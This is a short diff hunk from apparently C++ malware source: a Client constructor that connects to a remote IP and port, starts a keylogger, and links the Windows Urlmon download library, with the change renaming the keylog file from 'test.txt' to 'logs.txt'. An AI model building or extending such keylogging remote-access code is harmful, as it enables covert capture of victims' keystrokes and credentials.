@@ -10,7 +10,7 @@
 #pragma comment(lib, "Urlmon")
 
 Client::Client(const char *ip, uint16_t port) : 
-	m_connection(ip, port), m_keylogger("test.txt")
+	m_connection(ip, port), m_keylogger("logs.txt")
 { 
 	Start();
 }
